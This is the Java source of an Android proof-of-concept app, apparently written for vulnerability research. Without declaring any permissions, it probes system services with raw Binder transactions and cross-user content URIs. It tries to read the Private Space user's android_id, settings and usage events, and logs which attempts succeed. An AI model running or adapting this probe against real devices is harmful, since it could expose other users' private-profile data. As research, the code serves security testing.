package com.poc.crossuser;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private TextView logView;
    private StringBuilder logBuffer = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(11f);
        logView.setPadding(16, 16, 16, 16);
        scroll.addView(logView);
        setContentView(scroll);

        log("=== Cross-User Data Access PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("UserID: " + android.os.Process.myUid() / 100000);
        log("No permissions declared.\n");

        log("App started, beginning tests...");
        new Thread(() -> {
            try {
                runTests();
            } catch (Throwable t) {
                log("FATAL: " + t.getClass().getName() + ": " + t.getMessage());
            }
            log("=== ALL TESTS COMPLETE ===");
        }).start();
    }

    private void runTests() {
        testAppFunctionSearch();
        testSettingsCrossUser();
        testUsageStatsCrossUser();
    }

    private void testAppFunctionSearch() {
        log("--- Test 1: AppFunctionManager searchAppFunctions ---");
        log("Target: Enumerate app functions visible to user 11");
        try {
            IBinder binder = getServiceBinder("app_function");
            if (binder == null) {
                log("[FAIL] Could not get app_function binder");
                return;
            }
            log("[OK] Got app_function binder");

            String descriptor = "android.app.appfunctions.IAppFunctionManager";

            // Test each TX code (1-7) to find searchAppFunctions
            // and check if we can reach service logic without permission denial
            for (int tx = 1; tx <= 7; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(descriptor);

                // For searchAppFunctions, we need:
                // - AppFunctionAidlSearchSpec (Parcelable)
                // - ISearchAppFunctionsCallback (IBinder)
                // Write minimal search spec
                if (tx == 1 || tx == 2) {
                    // Try with a search spec parcel
                    data.writeInt(1); // non-null marker
                    // AppFunctionAidlSearchSpec fields:
                    data.writeString("*"); // query
                    data.writeInt(100); // maxResults
                    // callback binder
                    data.writeStrongBinder(new StubBinder("android.app.appfunctions.ISearchAppFunctionsCallback"));
                } else if (tx == 3) {
                    // getAppFunctionsPolicy - might not need params
                    // empty
                } else {
                    // Other methods - try minimal params
                    data.writeInt(0);
                }

                try {
                    boolean success = binder.transact(tx, data, reply, 0);
                    if (!success) {
                        log("  TX=" + tx + ": transact returned false");
                    } else {
                        int exCode = reply.readInt();
                        if (exCode == 0) {
                            log("  TX=" + tx + ": SUCCESS (no exception!)");
                            log("  >>> Zero-perm app reached AppFunction service logic");
                        } else {
                            String msg = reply.readString();
                            String shortMsg = msg != null ? msg.substring(0, Math.min(80, msg.length())) : "null";
                            if (msg != null && msg.contains("ermission")) {
                                log("  TX=" + tx + ": PERMISSION DENIED — " + shortMsg);
                            } else {
                                log("  TX=" + tx + ": Exception=" + exCode + " " + shortMsg);
                            }
                        }
                    }
                } catch (Exception e) {
                    log("  TX=" + tx + ": " + e.getClass().getSimpleName() + ": " + e.getMessage());
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            log("Error: " + e.getMessage());
        }
        log("");
    }

    private void testSettingsCrossUser() {
        log("--- Test 2: Cross-user Settings via ContentProvider ---");
        log("Target: Read user 11's android_id via content://11@settings/secure/");
        try {
            // Attempt to query settings for user 11 (Private Space)
            Uri uri = Uri.parse("content://11@settings/secure/android_id");
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(uri, null, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    int valueIdx = cursor.getColumnIndex("value");
                    String value = valueIdx >= 0 ? cursor.getString(valueIdx) : "no value column";
                    log("Result: android_id = " + value);
                    log(">>> VULNERABLE — read Private Space identifier!");
                } else {
                    log("Result: Empty cursor (no data)");
                }
                cursor.close();
            } else {
                log("Result: null cursor (access denied or provider not found)");
            }
        } catch (SecurityException e) {
            log("SecurityException: " + e.getMessage());
            log(">>> PROTECTED — requires INTERACT_ACROSS_USERS");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Also try system settings (less sensitive)
        log("\nTarget: Read user 11's system settings");
        try {
            Uri uri = Uri.parse("content://11@settings/system/volume_music");
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    int valueIdx = cursor.getColumnIndex("value");
                    String value = valueIdx >= 0 ? cursor.getString(valueIdx) : "no value column";
                    log("Result: volume_music = " + value);
                    log(">>> Cross-user system settings accessible!");
                } else {
                    log("Result: Empty cursor");
                }
                cursor.close();
            } else {
                log("Result: null cursor");
            }
        } catch (SecurityException e) {
            log("SecurityException: " + e.getMessage());
            log(">>> PROTECTED");
        } catch (Exception e) {
            log("Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testUsageStatsCrossUser() {
        log("--- Test 3: Cross-user UsageStats ---");
        log("Target: Query usage events for user 11");
        try {
            IBinder binder = getServiceBinder("usagestats");
            if (binder == null) {
                log("[FAIL] Could not get usagestats binder");
                return;
            }
            log("[OK] Got usagestats binder");

            String descriptor = "android.app.usage.IUsageStatsManager";

            // queryUsageStats(int intervalType, long begin, long end, String callingPkg)
            // Try TX=1 which should be queryUsageStats
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(descriptor);
            data.writeInt(0); // intervalType = INTERVAL_DAILY
            data.writeLong(System.currentTimeMillis() - 86400000L); // 24h ago
            data.writeLong(System.currentTimeMillis()); // now
            data.writeString(getPackageName());

            binder.transact(1, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                // Read ParceledListSlice
                int listSize = reply.readInt();
                log("queryUsageStats TX=1: SUCCESS, listSize=" + listSize);
                if (listSize > 0) {
                    log(">>> Got usage stats data!");
                }
            } else {
                String msg = reply.readString();
                if (msg != null && msg.contains("ermission")) {
                    log("TX=1: PERMISSION DENIED (needs PACKAGE_USAGE_STATS)");
                } else {
                    log("TX=1: Exception=" + exCode + " " + (msg != null ? msg.substring(0, Math.min(60, msg.length())) : ""));
                }
            }
            data.recycle();
            reply.recycle();

            // Now try queryEventsForUser - the cross-user variant
            // Signature: queryEventsForUser(int userId, long begin, long end, String pkg)
            // This is the key test - if this works without INTERACT_ACROSS_USERS, it's a bug
            log("\nTrying queryEventsForUser with userId=11...");
            for (int tx = 5; tx <= 8; tx++) {
                data = Parcel.obtain();
                reply = Parcel.obtain();
                data.writeInterfaceToken(descriptor);
                data.writeInt(11); // userId = 11 (Private Space!)
                data.writeLong(System.currentTimeMillis() - 86400000L);
                data.writeLong(System.currentTimeMillis());
                data.writeString(getPackageName());

                try {
                    binder.transact(tx, data, reply, 0);
                    exCode = reply.readInt();
                    if (exCode == 0) {
                        log("  TX=" + tx + " (userId=11): SUCCESS!");
                        log("  >>> VULNERABLE — cross-user usage stats access!");
                    } else {
                        String msg = reply.readString();
                        String shortMsg = msg != null ? msg.substring(0, Math.min(60, msg.length())) : "null";
                        if (msg != null && msg.contains("INTERACT_ACROSS")) {
                            log("  TX=" + tx + ": Requires INTERACT_ACROSS_USERS");
                        } else if (msg != null && msg.contains("ermission")) {
                            log("  TX=" + tx + ": Permission denied: " + shortMsg);
                        } else {
                            log("  TX=" + tx + ": Ex=" + exCode + " " + shortMsg);
                        }
                    }
                } catch (Exception e) {
                    log("  TX=" + tx + ": " + e.getClass().getSimpleName());
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            log("Error: " + e.getMessage());
        }
    }

    private IBinder getServiceBinder(String serviceName) {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, serviceName);
        } catch (Exception e) {
            return null;
        }
    }

    private java.io.FileWriter fileWriter;

    private void log(String msg) {
        logBuffer.append(msg).append("\n");
        try { runOnUiThread(() -> logView.setText(logBuffer.toString())); } catch (Exception e) {}
        try {
            if (fileWriter == null) {
                java.io.File f = new java.io.File(getExternalCacheDir(), "output.txt");
                fileWriter = new java.io.FileWriter(f);
            }
            fileWriter.write(msg + "\n");
            fileWriter.flush();
        } catch (Exception e) {}
    }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String descriptor) {
            this.descriptor = descriptor;
            attachInterface(null, descriptor);
        }
        @Override
        public String getInterfaceDescriptor() { return descriptor; }
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
